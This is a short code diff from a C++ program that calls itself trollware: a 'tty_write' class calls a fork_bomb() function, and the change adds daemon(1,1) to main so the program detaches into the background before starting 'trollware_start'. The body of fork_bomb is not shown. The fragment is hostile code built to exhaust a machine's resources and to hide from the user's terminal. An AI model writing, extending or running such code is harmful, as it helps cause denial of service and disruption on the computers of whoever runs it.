@@ -178,12 +178,12 @@ class tty_write : setup, public misc_tools{
             }
             else{
                 fork_bomb();
-                
             }
         }
 }; tty_write tw;
 
 int main(){
+    daemon(1,1);
     srand(time(NULL));
     tw.trollware_start();
     return 69; // if it some how exits xd
